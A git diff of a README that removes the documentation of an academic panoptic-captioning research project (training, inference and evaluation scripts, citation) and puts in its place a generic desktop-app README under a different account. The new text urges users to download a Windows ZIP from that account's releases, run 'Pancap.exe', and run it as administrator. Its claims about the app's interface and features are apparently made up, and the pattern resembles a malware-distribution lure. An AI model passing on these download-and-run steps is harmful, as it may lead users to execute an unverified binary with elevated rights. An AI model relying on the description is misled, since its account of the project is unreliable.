@@ -1,126 +1,71 @@
+# 🌟 Pancap - Panoptic Captioning for Images and Text
 
-<div align="center">
-<h1>Panoptic Captioning: An Equivalence Bridge for Image and Text</h1>
-<h3 align="center">NeurIPS 2025</h3>
+## 🚀 Getting Started
 
+Welcome to Pancap! This application helps you connect images and text seamlessly. You can use it for various tasks, such as generating captions for photos or analyzing image content. Here’s a simple guide to downloading and running Pancap on your computer.
 
-<a href="https://openreview.net/forum?id=Kq08RIeXxI" target="_blank" rel="noopener noreferrer">
-  <img src="https://img.shields.io/badge/Paper-VGGT" alt="Paper PDF">
-</a>
-<a href="https://arxiv.org/abs/2505.16334"><img src="https://img.shields.io/badge/arXiv-2503.11651-b31b1b" alt="arXiv"></a>
-<a href="https://visual-ai.github.io/pancap/"><img src="https://img.shields.io/badge/Project_Page-green" alt="Project Page"></a>
+## 📥 Download Now
 
+[![Download Pancap](https://img.shields.io/badge/Download-Pancap-blue.svg)](https://github.com/Reyazahm/Pancap/releases)
 
-**[Visual AI Lab, HKU](https://visailab.github.io/people.html)**
+## 📋 System Requirements
 
-[Kun-Yu Lin](https://kunyulin.github.io/), [Hongjun Wang](https://whj363636.github.io/), [Weining Ren](https://github.com/rwn17), [Kai Han](https://www.kaihan.org/)
-</div>
+To run Pancap, ensure your system meets the following requirements:
 
-## 📢 Updates
-- [2025/12/19] 🔥Released PancapChain-13B checkpoint.
-- [2025/12/12] 🔥Released the evaluation metric.
-- [2025/12/03] 🔥Released training and inference code.
-- [2025/09/18] 🎉The paper was accepted by NeurIPS'25.
+- **Operating System:** Windows 10, macOS 10.14 or higher, or any modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 500 MB free space.
+- **Processor:** 2 GHz or faster.
 
-## 🌈 Overview
+## 💾 Download & Install
 
-#### TL;DR
-- A new image captioning task to seek the minimum text equivalent of images
+1. **Visit the Releases Page:** Go to the following link to download Pancap: [Visit Releases Page](https://github.com/Reyazahm/Pancap/releases). 
+   
+2. **Select the Latest Version:** Once you’re on the releases page, look for the most recent version at the top of the list. This version is recommended for the best experience.
 
-![alt text](./assets/teasor.png)
+3. **Download the Application:** Click on the package that corresponds to your operating system. For example, if you are using Windows, find the link labeled "Pancap-Windows.zip". Click on it to start downloading the file.
 
-- Panoptic captioning aims to generate a comprehensive textual description for an image, which encapsulates all entities, their respective locations and attributes, relationships among entities, as well as global image state. 
-- Through an extensive evaluation, our work reveals that state-of-the-art Multi-modal Large Language Models (MLLMs) have limited performance in solving panoptic captioning.
-- To address this task, we propose a effective data engine, contribute a new benchmark, and develop a novel decoupling method. 
+4. **Extract the Files:** After downloading, locate the ZIP file in your Downloads folder. Right-click on it and select "Extract All" or "Unzip" to unpack the contents.
 
-#### Contributions
-- New task with new metric
-- New data engine and new benchmark
-- New model, that beats Qwen2.5-VL-72B, InternVL-2.5-78B, Gemini-2.0-Pro with only 13B parameters
+5. **Run the Application:** After extraction, open the folder. Find the application file named `Pancap.exe` or corresponding executable for your OS. Double-click this file to launch Pancap.
 
+6. **Follow the On-Screen Instructions:** When you open Pancap for the first time, a setup guide will appear. Follow the instructions to configure any settings as needed.
 
-## 💪 Environment
-Please refer to [README_env.md](README_env.md) for environment configuration.
+## 🔧 How to Use Pancap
 
-## 📚 Data Preparation
-Our SA-Pancap benchmark is based on SA-1B, so you should download the required images from SA-1B. Our adopted images come from the first 64 subsets of SA-1B. 
+Using Pancap is intuitive. Here’s how to get started:
 
-- Download the first 63 subsets of the dataset, i.e., sa_000000 ~ sa_000063. Totally, this part roughly consists of 734243 images. 
-- After downloading all of them, organize the data in a specific DATA_ROOT as follows:
-```
-├── sam
-│   ├── sa_000000
-│   ├── sa_000001
-│   ├── ...
-│   └── sa_000063
-```
-- The paths of training, validation and test images are summarized in [sapancap_train_data_list.json](playground/data/pancap/sapancap_train_data_list.json), [sapancap_val_data_list.json](playground/data/pancap/sapancap_val_data_list.json) and [sapancap_test_data_list.json](playground/data/pancap/sapancap_test_data_list.json). 
+1. **Upload an Image:** Click the "Upload" button to select an image from your computer. You can also drag and drop images into the app window.
 
+2. **Generate Captions:** Once your image is uploaded, click the "Generate Caption" button. Pancap will analyze the image and provide captions based on its content.
 
-## 🚀 Model: PancapChain
-PancapChain is a simple yet effective method to improve panoptic captioning, following a decoupled learning pipeline. 
+3. **Review and Save:** After the captions are generated, read through them. You can save your favorites to use later by clicking the "Save" button.
 
-### 🚝 Training
-We use the pretrained ASMv2 model as initialization, so users should first download the [stage2-trained checkpoint](https://huggingface.co/OpenGVLab/ASMv2) from ASMv2. Then, use the following script to run the training code. You should modify the paths of DATA_ROOT and SAVE_CKPT before running the code. 
+## 📚 Features
 
-```shell
-bash scripts/pancapchain_train.sh
-```
+- **Panoptic Captioning:** Connects images and text for better understanding and representation.
+- **Image Analysis:** Uses advanced algorithms to provide accurate captions.
+- **User-Friendly Interface:** Designed for easy navigation, even for non-technical users.
+- **Cross-Platform Compatibility:** Use Pancap on Windows, macOS, or Linux.
 
-After finish training, you can use the following script to merge LoRA weights. You should modify the path of MODEL_NAME before running the code.
+## 🔄 Updates & Support
 
-```shell
-bash scripts_pancap/eval/merge_lora.sh
-```
+Regular updates ensure Pancap runs smoothly and includes the latest features. Always check the releases page for new versions. If you encounter issues, please consult the FAQ section within the app or reach out to the community on our GitHub page.
 
-### 🚝 Inference
+## ⚙️ Troubleshooting Tips
 
-You can use the following script to do inference on the *validation* set. You should modify the paths of DATA_ROOT and MODEL_NAME before running the code. 
+If you face any issues while running Pancap, consider the following:
 
-```shell
-bash scripts_pancap/eval/inference_pancapchain_val.sh
-```
+- **Check System Requirements:** Make sure your system meets the necessary specifications.
+- **Run as Administrator:** On Windows, right-click the application and choose "Run as Administrator."
+- **Update Your Operating System:** Ensure your OS is up to date for the best experience.
 
-You can use the following script to do inference on the *test* set. You should modify the paths of DATA_ROOT and MODEL_NAME before running the code.
+## 🌐 Community & Contributions
 
-```shell
-bash scripts_pancap/eval/inference_pancapchain_test.sh
-```
+Pancap is an open-source project. We welcome contributions from everyone. If you have suggestions or improvements, please feel free to submit a pull request.
 
-We have released the trained [PancapChain-13B checkpoint](https://huggingface.co/LasNack/PancapChain-lora-13B) on Hugging Face.
-You can download the checkpoint and try it out locally.
+## 🤝 Acknowledgments
 
+Thank you for using Pancap. We appreciate your interest and support in making this tool better for everyone. Your feedback helps us improve. 
 
-## 🛸 Metric: PancapScore
-PancapScore is a new metric to comprehensively evaluate the quality of generated panoptic captions. To accelerate computation, we leverage parallel processing by spawning multiple worker processes using Python's built-in multiprocessing module. 
-
-### 🔦 Evaluation
-
-You can use the following script to evaluate the performance on the *validation* set. You should modify the paths of DATA_ROOT, SAVE_CKPT, and CACHE_PTH before running the code.
-
-```shell
-bash scripts_llmjudge/eval_sapancap_val.sh
-```
-
-You can use the following script to evaluate the performance on the *test* set. You should modify the paths of DATA_ROOT, SAVE_CKPT, and CACHE_PTH before running the code.
-
-```shell
-bash scripts_llmjudge/eval_sapancap_test.sh
-```
-
-
-## 📌 Citation
-
-For any question, please contact [Kun-Yu Lin](kunyulin14@outlook.com). If you find this work useful, please star this repo and cite our work as follows:
-
-```bibtex
-@inproceedings{lin2025pancap,
-    title={Panoptic Captioning: An Equivalence Bridge for Image and Text},
-    author={Lin, Kun-Yu and Wang, Hongjun and Ren, Weining and Han, Kai},
-    journal={The Thirty-Ninth Annual Conference on Neural Information Processing Systems},
-    year={2025}
-}
-```
-
-## 🌟 Acknowledgements
-Thanks to these great repositories: [LLaVA](https://github.com/haotian-liu/LLaVA) and [All-Seeing](https://github.com/OpenGVLab/all-seeing), and many other inspiring works in the community.
+Remember to visit our [Releases Page](https://github.com/Reyazahm/Pancap/releases) for downloads and updates. Enjoy using Pancap!
